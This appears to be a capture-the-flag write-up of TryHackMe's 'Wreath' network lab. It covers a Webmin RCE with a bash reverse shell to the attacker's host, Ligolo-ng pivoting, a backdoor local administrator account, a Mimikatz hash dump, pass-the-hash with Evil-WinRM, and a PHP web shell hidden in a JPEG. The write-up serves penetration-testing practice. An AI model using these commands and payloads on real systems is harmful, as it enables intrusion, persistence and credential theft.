# CTF: Wreath (TryHackMe)

- **Release Date:** [N/A]
    
- **Lab:** TryHackMe
    
- **Machine Name:** Wreath (Network)
    
- **Difficulty:** Hard
    
- **Target IPs:** 10.200.180.200 (Perimeter), 10.200.180.150 (Internal), 10.200.180.100 (Workstation)
	|
-  **Key skills/tools:** Ligolo-ng (TUN-based pivoting), CVE-2019-15107 (Webmin RCE), Polyglot JPEG Web Shells,  Mimikatz, Pass-the-Hash (PtH),  **Privilege Escalation:** Local group manipulation

---

## Introduction

A multi-stage network engagement focused on pivoting and lateral movement across diverse operating systems.

### Key skills/tools

- **Ligolo-ng:** Advanced TUN-based pivoting.
    
- **Mimikatz:** Credential harvesting.
    
- **Impacket:** Pass-the-Hash (PtH) and remote execution.
    
- **PowerShell:** Local group manipulation and persistence.
    

---

## Reconnaissance

Initial discovery on the perimeter gateway (**10.200.180.200**):

Bash

```
# Aggressive service scan
nmap -sV -sC -Pn 10.200.180.200
```

- **Port 10000:** Webmin (MiniServ 1.890): Target for CVE-2019-15107.
    

---

## Foothold & Initial Access

Exploiting the Webmin RCE to gain root and establishing a pivot.

### 1. Exploitation (Linux Root)

Bash

```
python3 exploit.py 10.200.180.200 10000 "bash -c 'bash -i >& /dev/tcp/10.250.180.4/4444 0>&1'"
```

### 2. Ligolo-ng Pivot Setup

Bash

```
# On Kali (Attacker)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 10.250.180.4:11601

# On 10.200.180.200 (Pivot)
./agent -connect 10.250.180.4:11601 -ignore-cert

# Back on Kali (Routing)
sudo ip route add 10.200.180.0/24 dev ligolo
```

---

## Privilege Escalation & Persistence (10.200.180.150)

Once an initial shell was obtained on the internal Windows target, the following commands were used to secure persistent administrative access.

### 1. Creating the Backdoor User

PowerShell

```
# Create the user account
net user amuzed Password123! /add

# Elevate to Local Administrator for full system control
net localgroup Administrators amuzed /add

# Add to Remote Management Users to enable Evil-WinRM access
net localgroup "Remote Management Users" amuzed /add
```

---

## Credential Harvesting & Lateral Movement

With administrative access, the goal was to harvest credentials to move to the final target.

### 1. Dumping Hashes with Mimikatz

PowerShell

```
.\mimikatz.exe "privilege::debug" "lsadump::sam" exit
```

- **Admin NTLM:** `37db630168e5f82aafa8461e05c6bbd1`
    

### 2. Pass-the-Hash (PtH)

Instead of cracking the hash, it was used directly to authenticate via **Evil-WinRM**:

Bash

```
evil-winrm -i 10.200.180.150 -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1
```

---

## Workstation Compromise (10.200.180.100)

The final target was compromised via an image upload vulnerability.

### 1. Polyglot JPEG Web Shell

Using **Exiftool** to hide a PHP shell inside a valid image file to bypass basic filters:

Bash

```
exiftool -Comment='<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>' image.jpg
```

### 2. Command Execution

Commands were executed by calling the uploaded image via the browser: `http://10.200.180.100/uploads/image.jpg?cmd=whoami`
